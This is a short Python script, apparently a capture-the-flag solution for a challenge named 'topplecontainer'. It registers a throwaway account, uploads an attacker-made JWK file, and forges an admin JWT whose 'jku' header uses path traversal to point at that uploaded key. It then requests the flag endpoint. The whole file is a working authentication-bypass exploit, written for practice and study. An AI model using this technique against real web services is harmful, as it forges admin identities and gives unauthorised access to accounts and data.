import shutil
import re
import jwt
import requests
import os

#URL = "http://localhost:6060"
URL = "https://topplecontainer.tjc.tf/"
USERNAME = os.urandom(16).hex()

session = requests.Session()
session.post(URL + "/register", data={"username": USERNAME})

resp = session.post(URL + "/upload", files={"file": open("jwk.json", "rb")})
uploaded_filename = resp.url.split("=")[-1]
token = jwt.encode(
	{
	"id": "admin"
	},
	key=open("private_key.pem", "rb").read(),
	algorithm="ES256",
	headers={"kid": "8384ea22-214b-48f9-afc5-0cf22d7c9859", "jku": "../uploads/" + uploaded_filename}
)

resp = requests.get(URL +"/flag", cookies={"token": token})
print(resp.text)